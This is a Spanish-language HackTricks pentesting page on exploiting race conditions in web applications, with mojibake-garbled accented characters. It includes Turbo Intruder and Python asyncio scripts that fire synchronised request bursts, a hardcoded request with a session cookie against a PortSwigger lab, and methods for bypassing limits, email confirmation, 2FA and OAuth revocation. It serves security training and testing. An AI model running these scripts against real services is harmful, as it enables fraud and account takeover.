# Condici√≥n de Carrera

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
Para obtener una comprensi√≥n profunda de esta t√©cnica, consulta el informe original en [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Mejorando los Ataques de Condici√≥n de Carrera

El principal desaf√≠o para aprovechar las condiciones de carrera es asegurarse de que m√∫ltiples solicitudes se manejen al mismo tiempo, con **muy poca diferencia en sus tiempos de procesamiento, idealmente, menos de 1ms**.

Aqu√≠ puedes encontrar algunas t√©cnicas para Sincronizar Solicitudes:

#### Ataque de un Solo Paquete HTTP/2 vs. Sincronizaci√≥n del √öltimo Byte de HTTP/1.1

* **HTTP/2**: Permite enviar dos solicitudes sobre una √∫nica conexi√≥n TCP, reduciendo el impacto del jitter de red. Sin embargo, debido a variaciones en el lado del servidor, dos solicitudes pueden no ser suficientes para un exploit de condici√≥n de carrera consistente.
* **HTTP/1.1 'Sincronizaci√≥n del √öltimo Byte'**: Permite el preenv√≠o de la mayor√≠a de las partes de 20-30 solicitudes, reteniendo un peque√±o fragmento, que luego se env√≠a juntas, logrando una llegada simult√°nea al servidor.

La **preparaci√≥n para la Sincronizaci√≥n del √öltimo Byte** implica:

1. Enviar encabezados y datos del cuerpo menos el byte final sin finalizar el flujo.
2. Pausar durante 100ms despu√©s del env√≠o inicial.
3. Deshabilitar TCP\_NODELAY para utilizar el algoritmo de Nagle para agrupar los marcos finales.
4. Hacer ping para calentar la conexi√≥n.

El posterior env√≠o de marcos retenidos deber√≠a resultar en su llegada en un solo paquete, verificable a trav√©s de Wireshark. Este m√©todo no se aplica a archivos est√°ticos, que normalmente no est√°n involucrados en ataques de RC.

### Adapt√°ndose a la Arquitectura del Servidor

Comprender la arquitectura del objetivo es crucial. Los servidores front-end pueden enrutar las solicitudes de manera diferente, afectando el tiempo. El calentamiento preventivo de la conexi√≥n del lado del servidor, a trav√©s de solicitudes inconsecuentes, podr√≠a normalizar el tiempo de solicitud.

#### Manejo de Bloqueos Basados en Sesiones

Los frameworks como el manejador de sesiones de PHP serializan las solicitudes por sesi√≥n, lo que potencialmente oculta vulnerabilidades. Utilizar tokens de sesi√≥n diferentes para cada solicitud puede evitar este problema.

#### Superar L√≠mites de Tasa o Recursos

Si el calentamiento de la conexi√≥n no es efectivo, provocar intencionalmente retrasos en los l√≠mites de tasa o recursos de los servidores web a trav√©s de una inundaci√≥n de solicitudes ficticias podr√≠a facilitar el ataque de un solo paquete al inducir un retraso del lado del servidor propicio para las condiciones de carrera.

## Ejemplos de Ataque

* **Tubo Intruder - Ataque de un solo paquete HTTP2 (1 punto final)**: Puedes enviar la solicitud a **Turbo Intruder** (`Extensiones` -> `Turbo Intruder` -> `Enviar a Turbo Intruder`), puedes cambiar en la solicitud el valor que deseas probar por fuerza bruta para **`%s`** como en `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` y luego seleccionar el **`ejemplos/race-single-packer-attack.py`** del men√∫ desplegable:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si vas a **enviar valores diferentes**, podr√≠as modificar el c√≥digo con este que utiliza una lista de palabras del portapapeles:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Si la web no es compatible con HTTP2 (solo HTTP1.1), utiliza `Engine.THREADED` o `Engine.BURP` en lugar de `Engine.BURP2`.
{% endhint %}

* **Intrusi√≥n de Tubo - Ataque de un solo paquete HTTP2 (Varios endpoints)**: En caso de que necesites enviar una solicitud a 1 endpoint y luego m√∫ltiples a otros endpoints para activar la RCE, puedes modificar el script `race-single-packet-attack.py` con algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Tambi√©n est√° disponible en **Repeater** a trav√©s de la nueva opci√≥n '**Enviar grupo en paralelo**' en Burp Suite.
* Para **limit-overrun** simplemente podr√≠as agregar la **misma solicitud 50 veces** en el grupo.
* Para el **calentamiento de la conexi√≥n**, podr√≠as **agregar** al **principio** del **grupo** algunas **solicitudes** a alguna parte no est√°tica del servidor web.
* Para **retrasar** el proceso **entre** el procesamiento **de una solicitud y otra** en 2 pasos de subestado, podr√≠as **agregar solicitudes adicionales entre** ambas solicitudes.
* Para un RC de **m√∫ltiples puntos finales** podr√≠as comenzar enviando la **solicitud** que **va al estado oculto** y luego **50 solicitudes** justo despu√©s que **explotan el estado oculto**.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Raw BF

Antes de la investigaci√≥n anterior, estos eran algunos payloads utilizados que simplemente intentaban enviar los paquetes lo m√°s r√°pido posible para causar un RC.

* **Repeater:** Consulta los ejemplos de la secci√≥n anterior.
* **Intruder**: Env√≠a la **solicitud** a **Intruder**, establece el **n√∫mero de hilos** en **30** dentro del men√∫ **Opciones y**, selecciona como payload **Cargas √∫tiles nulas** y genera **30.**
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## Metodolog√≠a de RC

### L√≠mite de sobrepaso / TOCTOU

Este es el tipo m√°s b√°sico de condici√≥n de carrera donde **vulnerabilidades** que **aparecen** en lugares que **limitan la cantidad de veces que puedes realizar una acci√≥n**. Como usar el mismo c√≥digo de descuento varias veces en una tienda web. Un ejemplo muy f√°cil se puede encontrar en [**este informe**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) o en [**este bug**](https://hackerone.com/reports/759247)**.**

Existen muchas variaciones de este tipo de ataque, incluyendo:

- Canjear una tarjeta de regalo varias veces
- Calificar un producto varias veces
- Retirar o transferir efectivo en exceso de tu saldo de cuenta
- Reutilizar una soluci√≥n CAPTCHA √∫nica
- Saltarse un l√≠mite de velocidad anti-fuerza bruta

### **Subestados ocultos**

Explotar condiciones de carrera complejas a menudo implica aprovechar oportunidades breves para interactuar con subestados de m√°quina ocultos o **no intencionales**. As√≠ es como se aborda esto:

1. **Identificar posibles subestados ocultos**
   - Comienza por se√±alar los puntos finales que modifican o interact√∫an con datos cr√≠ticos, como perfiles de usuario o procesos de restablecimiento de contrase√±a. Enf√≥cate en:
     - **Almacenamiento**: Prefiere los puntos finales que manipulan datos persistentes en el servidor sobre aquellos que manejan datos en el lado del cliente.
     - **Acci√≥n**: Busca operaciones que alteren datos existentes, las cuales son m√°s propensas a crear condiciones explotables en comparaci√≥n con aquellas que agregan nuevos datos.
     - **Clave**: Los ataques exitosos generalmente involucran operaciones clave en el mismo identificador, por ejemplo, nombre de usuario o token de restablecimiento.
2. **Realizar sondas iniciales**
   - Prueba los puntos finales identificados con ataques de condici√≥n de carrera, observando cualquier desviaci√≥n de los resultados esperados. Respuestas inesperadas o cambios en el comportamiento de la aplicaci√≥n pueden indicar una vulnerabilidad.
3. **Demostrar la vulnerabilidad**
   - Reduce el ataque al n√∫mero m√≠nimo de solicitudes necesarias para explotar la vulnerabilidad, a menudo solo dos. Este paso puede requerir m√∫ltiples intentos o automatizaci√≥n debido al tiempo preciso involucrado.

### Ataques sensibles al tiempo

La precisi√≥n en el tiempo de las solicitudes puede revelar vulnerabilidades, especialmente cuando se utilizan m√©todos predecibles como marcas de tiempo para tokens de seguridad. Por ejemplo, generar tokens de restablecimiento de contrase√±a basados en marcas de tiempo podr√≠a permitir tokens id√©nticos para solicitudes simult√°neas.

**Para explotar:**

- Utiliza un tiempo preciso, como un ataque de paquete √∫nico, para realizar solicitudes de restablecimiento de contrase√±a concurrentes. Los tokens id√©nticos indican una vulnerabilidad.

**Ejemplo:**

- Solicita dos tokens de restablecimiento de contrase√±a al mismo tiempo y comp√°ralos. Los tokens coincidentes sugieren un fallo en la generaci√≥n de tokens.

**Consulta este** [**Laboratorio de PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **para probar esto.**

## Estudios de casos de subestados ocultos

### Pagar y agregar un art√≠culo

Consulta este [**Laboratorio de PortSwigger**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver c√≥mo **pagar** en una tienda y **agregar un art√≠culo adicional** que **no necesitar√°s pagar**.

### Confirmar otros correos electr√≥nicos

La idea es **verificar una direcci√≥n de correo electr√≥nico y cambiarla a otra al mismo tiempo** para averiguar si la plataforma verifica la nueva direcci√≥n cambiada.

### Cambiar correo electr√≥nico a 2 direcciones de correo electr√≥nico basadas en cookies

Seg√∫n [**esta investigaci√≥n**](https://portswigger.net/research/smashing-the-state-machine) Gitlab era vulnerable a una toma de control de esta manera porque podr√≠a **enviar** el **token de verificaci√≥n de correo electr√≥nico de un correo electr√≥nico al otro correo electr√≥nico**.

**Consulta este** [**Laboratorio de PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **para probar esto.**

### Estados de base de datos ocultos / Bypass de confirmaci√≥n

Si se utilizan **2 escrituras diferentes** para **agregar informaci√≥n** dentro de una **base de datos**, hay un peque√±o per√≠odo de tiempo donde **solo se ha escrito el primer dato** dentro de la base de datos. Por ejemplo, al crear un usuario, el **nombre de usuario** y la **contrase√±a** podr√≠an ser **escritos** y luego el **token** para confirmar la cuenta reci√©n creada se escribe. Esto significa que por un corto tiempo el **token para confirmar una cuenta es nulo**.

Por lo tanto, **registrarse en una cuenta y enviar varias solicitudes con un token vac√≠o** (`token=` o `token[]=` u otra variaci√≥n) para confirmar la cuenta de inmediato podr√≠a permitir **confirmar una cuenta** donde no controlas el correo electr√≥nico.

**Consulta este** [**Laboratorio de PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **para probar esto.**

### Bypass de 2FA

El siguiente pseudo-c√≥digo es vulnerable a una condici√≥n de carrera porque en un tiempo muy corto el **2FA no se aplica** mientras se crea la sesi√≥n:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Persistencia eterna de OAuth2

Hay varios [**proveedores de OAuth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Estos servicios te permitir√°n crear una aplicaci√≥n y autenticar a los usuarios que el proveedor haya registrado. Para hacerlo, el **cliente** necesitar√° **permitir que tu aplicaci√≥n** acceda a algunos de sus datos dentro del **proveedor de OAuth**.\
As√≠ que, hasta aqu√≠ solo un inicio de sesi√≥n com√∫n con google/linkedin/github... donde se te muestra una p√°gina que dice: "_La aplicaci√≥n \<InsertCoolName> quiere acceder a tu informaci√≥n, ¬ødeseas permitirlo?_"

#### Condici√≥n de Carrera en `authorization_code`

El **problema** surge cuando **aceptas** y autom√°ticamente env√≠a un **`authorization_code`** a la aplicaci√≥n maliciosa. Luego, esta **aplicaci√≥n abusa de una Condici√≥n de Carrera en el proveedor de servicios de OAuth para generar m√°s de un AT/RT** (_Authentication Token/Refresh Token_) a partir del **`authorization_code`** para tu cuenta. B√°sicamente, abusar√° del hecho de que has aceptado que la aplicaci√≥n acceda a tus datos para **crear varias cuentas**. Entonces, si **dejas de permitir que la aplicaci√≥n acceda a tus datos, un par de AT/RT se eliminar√°, pero los otros seguir√°n siendo v√°lidos**.

#### Condici√≥n de Carrera en `Refresh Token`

Una vez que has **obtenido un RT v√°lido** podr√≠as intentar **abusar de √©l para generar varios AT/RT** y **incluso si el usuario cancela los permisos** para que la aplicaci√≥n maliciosa acceda a sus datos, **varios RT seguir√°n siendo v√°lidos**.

## **CC en WebSockets**

En [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) puedes encontrar un PoC en Java para enviar mensajes de websocket en **paralelo** y abusar de **Condiciones de Carrera tambi√©n en Web Sockets**.

## Referencias

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
